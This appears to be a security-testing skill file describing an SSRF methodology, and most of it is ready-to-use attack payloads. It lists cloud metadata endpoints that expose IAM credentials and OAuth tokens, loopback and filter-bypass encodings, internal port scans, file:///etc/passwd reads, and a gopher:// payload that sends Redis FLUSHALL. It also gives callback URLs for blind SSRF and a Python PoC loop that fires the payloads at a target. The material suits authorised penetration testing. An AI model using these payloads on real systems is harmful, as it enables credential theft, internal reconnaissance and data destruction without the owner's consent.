---
name: ssrf
description: Server-Side Request Forgery testing methodology for internal service access and cloud metadata
version: 1.0.0
tags: [injection, network, A10:2021, API7:2023]
---

# SSRF Testing Methodology

## Overview
SSRF allows attackers to make the server send requests to unintended locations, accessing internal services or cloud metadata.

## Types
1. **Basic SSRF**: Direct URL access
2. **Blind SSRF**: No direct response, use callbacks
3. **Partial SSRF**: Limited control over URL

## Testing Methodology

### 1. Identify URL Inputs
- URL parameters (url=, link=, src=, redirect=)
- Webhook configurations
- PDF/Image generators
- File imports (from URL)
- API integrations

### 2. Basic Payloads
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://0177.0.0.1  (octal)
http://2130706433  (decimal)
http://0x7f.0x0.0x0.0x1  (hex)
```

### 3. Cloud Metadata Endpoints

#### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
```

#### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/project/project-id
```

#### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token
```

### 4. Internal Service Scanning
```
http://127.0.0.1:22 (SSH)
http://127.0.0.1:3306 (MySQL)
http://127.0.0.1:6379 (Redis)
http://127.0.0.1:27017 (MongoDB)
http://127.0.0.1:9200 (Elasticsearch)
http://127.0.0.1:8080 (Internal web)
```

### 5. Protocol Smuggling
```
file:///etc/passwd
dict://127.0.0.1:6379/INFO
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

### 6. Bypass Techniques
```
http://127.0.0.1.nip.io
http://localtest.me
http://127.1
http://0
http://[0:0:0:0:0:ffff:127.0.0.1]
```

### 7. Blind SSRF with Callback
```
http://your-callback-server.com/ssrf-test
http://burpcollaborator.net/ssrf
```

## PoC Template
```python
import requests

def test_ssrf(endpoint, param):
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:22",
        "http://localhost:6379",
    ]
    
    for payload in payloads:
        try:
            r = requests.get(endpoint, params={param: payload}, timeout=5)
            if "ami-id" in r.text or "SSH" in r.text:
                print(f"[+] SSRF found: {payload}")
                return True
        except:
            pass
    return False
```

## Impact
- Access internal services
- Read cloud credentials
- Internal network scanning
- Remote code execution (via Redis, etc.)
